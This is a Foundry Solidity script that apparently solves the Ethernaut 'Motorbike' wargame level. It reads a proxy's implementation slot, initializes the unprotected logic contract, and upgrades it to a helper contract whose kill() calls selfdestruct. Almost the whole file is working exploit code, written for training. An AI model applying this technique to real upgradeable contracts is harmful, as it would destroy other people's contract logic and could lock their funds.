//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";

import {hackMotobike} from "../../src/ethernaut/motorbike.sol";

/*
1-> get the address of the implementation contract 
2-> call initialize() function from the logic contract
3-> deploy the hack contract that contain the selfdestruct() function 
4-> call the upgradeToAndCall() function from logic contract passing the address of the hack contract and the 
    signature encoded of the function that contain the selfdestruc() method 
*/
contract fuckit is Script {
    hackMotobike hack;
    address Proxy = 0xcE4aaf794EA88E53B5168Fe59309f022A0d3385B;
    bytes32 slot =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function run() public {
        vm.startBroadcast();
        bytes32 add = vm.load(Proxy, slot);
        address logic = address(uint160(uint(add)));
        (bool seccess, ) = logic.call(abi.encodeWithSignature("initialize()"));
        require(seccess, "failed to call the initialize function");
        hack = new hackMotobike();
        bytes memory kill = abi.encodeWithSignature("kill()");
        bytes memory dataToPass = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(hack),
            kill
        );
        (bool ok, ) = logic.call(dataToPass);
        require(ok, "failed to call the function to upgrade");
        vm.stopBroadcast();
        console.logBytes32(vm.load(Proxy, slot));
    }
}
